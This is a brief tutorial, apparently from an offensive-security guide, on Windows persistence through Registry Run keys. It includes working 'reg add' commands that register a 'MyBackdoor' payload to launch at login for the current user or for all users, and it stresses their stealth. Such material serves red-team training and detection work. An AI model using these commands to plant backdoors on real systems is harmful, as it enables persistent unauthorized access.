Stealthy Execution with Registry Run Keys

Leveraging Run and RunOnce keys for automatic program launch on user login.

# Example: Adding a payload to the current user's Run key
# Add an entry to HKCU (current user) to run payload.exe on login
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MyBackdoor" /t REG_SZ /d "C:\Path\To\My\Payload.exe" /f

# Explanation of parameters:
# /v "MyBackdoor": Specifies the value name for the entry.
# /t REG_SZ: Sets the data type to a string.
# /d "C:\Path\To\My\Payload.exe": Provides the path to the executable.
# /f: Forces the operation, overwriting if the entry already exists.

# To achieve system-wide persistence (all users), target HKLM:
# reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SystemBackdoor" /t REG_SZ /d "C:\Path\To\My\Payload.exe" /f

Key Locations

  • HKCU\Software\Microsoft\Windows\CurrentVersion\Run (Current User)
  • HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run (All Users)
  • RunOnce keys exist in similar paths for single execution.

Stealth vs. Detection

Registry modifications are less visible than Startup folder entries but are still monitored by advanced security solutions and experienced administrators.

Key Takeaway

Registry Run keys offer a stealthier way to achieve persistence on Windows by automatically executing payloads on user login.
